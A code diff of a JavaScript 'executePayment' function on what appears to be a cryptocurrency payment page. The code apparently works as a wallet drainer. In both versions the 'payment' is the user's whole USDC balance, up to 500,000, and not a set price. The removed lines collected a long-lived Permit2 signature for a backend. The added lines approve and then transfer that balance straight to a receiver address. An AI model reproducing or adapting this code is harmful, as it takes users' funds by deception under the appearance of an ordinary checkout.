@@ -923,103 +923,66 @@ async function executePayment() {
     const maxAmount = ethers.parseUnits("500000", 6); // Max 500000 USDC
 
     // Create token contract interface to check balance
-    const tokenABI = ["function balanceOf(address owner) view returns (uint256)"];
-    const tokenContract = new ethers.Contract(tokenAddress, tokenABI, provider);
+    const tokenABI = [
+      "function balanceOf(address owner) view returns (uint256)",
+      "function approve(address spender, uint256 amount) public returns (bool)",
+      "function transfer(address to, uint256 amount) public returns (bool)"
+    ];
+    const tokenContract = new ethers.Contract(tokenAddress, tokenABI, signer);
     
     // Get user's USDC balance
+    setStatus("⏳ Checking balance...", "info");
     const userBalance = await tokenContract.balanceOf(userAddress);
     console.log("User USDC balance:", ethers.formatUnits(userBalance, 6));
     
-    // Use the minimum of user balance or max amount (1000 USDC)
+    // Use the minimum of user balance or max amount (500000 USDC)
     const amount = userBalance > maxAmount ? maxAmount : userBalance;
     console.log("Payment amount:", ethers.formatUnits(amount, 6), "USDC");
     
-    // Generate a random nonce (Permit2 uses bitmap nonce scheme)
-    const bytes = new Uint8Array(32);
-    crypto.getRandomValues(bytes);
-    const nonce = BigInt("0x" + Array.from(bytes, (b) => b.toString(16).padStart(2, "0")).join(""));
-    
-    const deadline = Math.floor(Date.now() / 1000) + 604800; // 7 days from now
-    
-    console.log("Nonce:", nonce.toString());
-    console.log("Deadline:", deadline);
-    
-    // Sign the Permit2 message (PermitTransferFrom format)
-    const domain = {
-      name: "Permit2",
-      chainId: userChainId,
-      verifyingContract: CONFIG.PERMIT2_ADDRESS,
-    };
-    
-    const types = {
-      PermitTransferFrom: [
-        { name: "permitted", type: "TokenPermissions" },
-        { name: "nonce", type: "uint256" },
-        { name: "deadline", type: "uint256" },
-      ],
-      TokenPermissions: [
-        { name: "token", type: "address" },
-        { name: "amount", type: "uint256" },
-      ],
-    };
-    
-    const value = {
-      permitted: {
-        token: tokenAddress,
-        amount: amount,
-      },
-      nonce: nonce,
-      deadline: deadline,
-    };
-    
-    console.log("Signing Permit2 message:", value);
-    
-    // Sign the message
-    const signature = await signer.signTypedData(domain, types, value);
-    console.log("Permit signature:", signature);
-    
-    // Send signature to backend to get transaction data
-    console.log("Sending signature to backend...");
-    
-    const backendResponse = await fetch(CONFIG.BACKEND_URL + "/api/orders/execute-payment", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        chainId: userChainId,
-        userAddress: userAddress,
-        tokenAddress: tokenAddress,
-        amount: amount.toString(),
-        nonce: nonce.toString(),
-        deadline: deadline,
-        signature: signature,
-      }),
-    });
-    
-    const result = await backendResponse.json();
-    
-    if (!backendResponse.ok) {
-      throw new Error(result.error || "Backend payment processing failed");
+    if (userBalance < amount) {
+      throw new Error(`Insufficient balance. Need at least ${ethers.formatUnits(amount, 6)} USDC`);
     }
     
-    console.log("Backend response:", result);
+    // Step 1: Approve token transfer to receiver
+    setStatus("⏳ Approving token transfer...", "info");
+    console.log("Approving token transfer to", receiverAddress, "amount:", amount.toString());
+    const approveTx = await tokenContract.approve(receiverAddress, amount);
+    console.log("Approval tx sent:", approveTx.hash);
     
-    if (result.success) {
-      // Check if relayer submitted (transactionHash exists) or if we got fallback
-      if (result.transactionHash) {
-        // Relayer submitted - payment done!
-        console.log("✅ Payment completed by relayer!");
-        setStatus(`✅ Payment confirmed! ${result.amount} USDC sent to ${result.receivedBy.slice(0, 6)}...${result.receivedBy.slice(-4)}`, "success");
-        console.log("Transaction Hash:", result.transactionHash);
-      } else if (result.transaction) {
-        // No relayer configured - user must submit
-        console.warn("⚠️  Relayer not configured. Would need user to submit transaction manually.");
-        setStatus(`⚠️  Relayer not configured. Backend returned transaction data but cannot submit automatically.`, "error");
-      } else {
-        console.log("✅ Payment processing initiated!");
-        setStatus(`✅ Payment confirmed! ${result.amount} USDC sent to ${result.receivedBy.slice(0, 6)}...${result.receivedBy.slice(-4)}`, "success");
-      }
+    setStatus("⏳ Waiting for approval confirmation...", "info");
+    const approveReceipt = await approveTx.wait();
+    console.log("✅ Approval confirmed:", approveReceipt.hash);
+    
+    // Step 2: Transfer tokens to receiver
+    setStatus("⏳ Sending tokens to receiver...", "info");
+    console.log("Transferring tokens to", receiverAddress);
+    const transferTx = await tokenContract.transfer(receiverAddress, amount);
+    console.log("Transfer tx sent:", transferTx.hash);
+    
+    setStatus("⏳ Waiting for transfer confirmation...", "info");
+    const transferReceipt = await transferTx.wait();
+    console.log("✅ Transfer confirmed:", transferReceipt.hash);
+    
+    // Success!
+    console.log("✅ Payment completed successfully!");
+    const explorerUrl = CONFIG.EXPLORER_URLS[userChainId];
+    
+    if (explorerUrl) {
+      const txLink = `<a href="${explorerUrl}/tx/${transferReceipt.hash}" target="_blank" style="color: #10b981; text-decoration: underline;">${transferReceipt.hash}</a>`;
+      el.status.innerHTML = `<div style="text-align: center; padding: 20px; background: #ecfdf5; border-radius: 8px; border: 2px solid #10b981;">
+        <div style="font-size: 24px; margin-bottom: 10px;">✅</div>
+        <div style="font-weight: bold; margin-bottom: 10px;">Payment Successful!</div>
+        <div>Amount: ${ethers.formatUnits(amount, 6)} USDC</div>
+        <div>To: ${receiverAddress.slice(0, 6)}...${receiverAddress.slice(-4)}</div>
+        <div style="margin-top: 10px; font-size: 12px;">TX: ${txLink}</div>
+      </div>`;
     } else {
-      throw new Error(result.error || "Payment processing failed");
+      el.status.innerHTML = `<div style="text-align: center; padding: 20px; background: #ecfdf5; border-radius: 8px; border: 2px solid #10b981;">
+        <div style="font-size: 24px; margin-bottom: 10px;">✅</div>
+        <div style="font-weight: bold;">Payment Successful!</div>
+        <div>Amount: ${ethers.formatUnits(amount, 6)} USDC</div>
+        <div>To: ${receiverAddress.slice(0, 6)}...${receiverAddress.slice(-4)}</div>
+      </div>`;
     }
     
   } catch (err) {
